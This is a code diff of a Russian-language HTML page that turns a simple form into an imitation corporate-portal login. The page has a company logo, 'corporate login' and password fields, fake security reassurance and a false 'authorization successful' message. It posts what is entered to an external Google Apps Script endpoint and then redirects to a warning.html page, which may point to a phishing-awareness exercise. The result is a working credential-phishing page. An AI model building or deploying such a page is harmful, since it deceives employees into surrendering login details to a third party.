@@ -3,100 +3,115 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Форма авторизации</title>
+    <title>Корпоративный портал - Вход в систему</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            background: linear-gradient(135deg, #f5f7fa 0%, #e6e9f0 100%);
             margin: 0;
             padding: 0;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
+            color: #333;
         }
         
         .container {
             background-color: white;
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
             width: 100%;
-            max-width: 400px;
-            padding: 40px;
+            max-width: 420px;
+            padding: 30px;
             text-align: center;
+            border: 1px solid #e0e0e0;
+        }
+        
+        .logo-container {
+            margin-bottom: 25px;
+            padding: 10px 0;
+        }
+        
+        .logo {
+            max-height: 60px;
+            max-width: 100%;
         }
         
         h1 {
             color: #2c3e50;
-            margin-bottom: 30px;
-            font-size: 24px;
+            margin-bottom: 25px;
+            font-size: 22px;
+            font-weight: 600;
         }
         
         .form-group {
-            margin-bottom: 20px;
+            margin-bottom: 18px;
             text-align: left;
         }
         
         label {
             display: block;
             margin-bottom: 8px;
-            color: #7f8c8d;
+            color: #555;
             font-size: 14px;
-            font-weight: 600;
+            font-weight: 500;
         }
         
         input {
             width: 100%;
             padding: 12px 15px;
-            border: 2px solid #e0e0e0;
-            border-radius: 8px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
             font-size: 14px;
-            transition: all 0.3s;
+            transition: all 0.2s;
             box-sizing: border-box;
+            background-color: #fafafa;
         }
         
         input:focus {
             border-color: #3498db;
             outline: none;
-            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.2);
+            box-shadow: 0 0 0 2px rgba(52, 152, 219, 0.2);
+            background-color: white;
         }
         
         button {
-            background: linear-gradient(to right, #3498db, #2c3e50);
+            background-color: #2c5aa0;
             color: white;
             border: none;
-            padding: 14px 20px;
-            border-radius: 8px;
+            padding: 13px 20px;
+            border-radius: 4px;
             cursor: pointer;
-            font-size: 16px;
+            font-size: 15px;
             font-weight: 600;
             width: 100%;
-            transition: all 0.3s;
+            transition: all 0.2s;
             margin-top: 10px;
         }
         
         button:hover {
-            opacity: 0.9;
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            background-color: #234b8a;
         }
         
         #message {
             margin-top: 20px;
             padding: 12px;
-            border-radius: 8px;
+            border-radius: 4px;
             font-size: 14px;
             display: none;
         }
         
         .success {
-            background-color: #d4edda;
-            color: #155724;
+            background-color: #e6f7ee;
+            color: #0a5c36;
+            border: 1px solid #b7ebd0;
         }
         
         .error {
-            background-color: #f8d7da;
-            color: #721c24;
+            background-color: #fce8e8;
+            color: #a51818;
+            border: 1px solid #f5c2c2;
         }
         
         .password-container {
@@ -105,38 +120,99 @@
         
         .toggle-password {
             position: absolute;
-            right: 10px;
-            top: 35px;
+            right: 12px;
+            top: 36px;
             cursor: pointer;
-            color: #7f8c8d;
+            color: #666;
             font-size: 12px;
+            background: #f0f0f0;
+            padding: 2px 8px;
+            border-radius: 3px;
+        }
+        
+        .footer-links {
+            margin-top: 25px;
+            font-size: 13px;
+            color: #777;
+        }
+        
+        .footer-links a {
+            color: #2c5aa0;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .language-selector {
+            margin-top: 15px;
+            font-size: 13px;
+        }
+        
+        .language-selector select {
+            padding: 5px;
+            border-radius: 3px;
+            border: 1px solid #ddd;
+            background-color: white;
+        }
+        
+        .security-info {
+            margin-top: 20px;
+            padding-top: 15px;
+            border-top: 1px solid #eee;
+            font-size: 12px;
+            color: #888;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Форма авторизации</h1>
+        <!--  ЛОГОТИП КОМПАНИИ НИЖЕ -->
+        <div class="logo-container">
+            <img src="https://sun1-98.userapi.com/s/v1/if1/jgkFTXbFUUNVXlxyfkW2FLgfb6TWhK7D54GFRGRV18LO-Q2Hz1bCuD0oC7bOBsAjT5sqLL_3.jpg?size=647x648&quality=96&crop=22,22,647,648&ava=1" alt="Логотип компании" class="logo">
+        </div>
+        
+        <h1>Вход в корпоративную систему</h1>
         <form id="dataForm">
             <div class="form-group">
-                <label for="lastname">Фамилия:</label>
-                <input type="text" id="lastname" name="lastname" required>
+                <label for="lastname">Фамилия</label>
+                <input type="text" id="lastname" name="lastname" required placeholder="Введите вашу фамилию">
             </div>
             
             <div class="form-group">
-                <label for="username">Логин:</label>
-                <input type="text" id="username" name="username" required>
+                <label for="username">Корпоративный логин</label>
+                <input type="text" id="username" name="username" required placeholder="Введите ваш логин">
             </div>
             
             <div class="form-group">
-                <label for="password">Пароль:</label>
+                <label for="password">Пароль</label>
                 <div class="password-container">
-                    <input type="password" id="password" name="password" required>
+                    <input type="password" id="password" name="password" required placeholder="Введите ваш пароль">
                     <span class="toggle-password" onclick="togglePassword()">Показать</span>
                 </div>
             </div>
             
             <button type="submit">Войти</button>
         </form>
+        
+        <div class="footer-links">
+            <a href="#">Забыли пароль?</a>
+            <a href="#">Регистрация нового сотрудника</a>
+            <a href="#">Помощь</a>
+        </div>
+        
+        <div class="language-selector">
+            <select>
+                <option>Русский</option>
+                <option>English</option>
+            </select>
+        </div>
+        
+        <div class="security-info">
+            <p>Для защиты ваших данных убедитесь, что адрес в браузере начинается с https://portal.yourcompany.com</p>
+        </div>
         
         <div id="message"></div>
     </div>
@@ -163,15 +239,13 @@
             const message = document.getElementById('message');
             
             // Показываем загрузку
-            message.textContent = "Отправка данных...";
+            message.textContent = "Проверка учетных данных...";
             message.className = "";
             message.style.display = "block";
             
             try {
-                // Ваш URL Google Apps Script
                 const scriptUrl = 'https://script.google.com/macros/s/AKfycbw04Rr8q1cfDadwgsgJpM0tfAbPcOzIY9HNImon8Obz-JrZ9-Otei3-D1zNUu5N61vQvQ/exec';
                 
-                // Отправляем только нужные данные (без пароля)
                 await fetch(scriptUrl, {
                     method: 'POST',
                     mode: 'no-cors',
@@ -185,18 +259,16 @@
                     }),
                 });
                 
-                // Показываем сообщение об успехе на короткое время
-                message.textContent = 'Данные успешно отправлены!';
+                message.textContent = 'Авторизация успешна. Перенаправление...';
                 message.className = 'success';
                 
-                // Перенаправляем на warning.html через 1.5 секунды
                 setTimeout(() => {
                     window.location.href = 'warning.html';
                 }, 1500);
                 
             } catch (error) {
                 console.error('Ошибка:', error);
-                message.textContent = 'Ошибка соединения. Попробуйте ещё раз.';
+                message.textContent = 'Ошибка подключения к серверу. Попробуйте позже.';
                 message.className = 'error';
                 
                 setTimeout(() => {
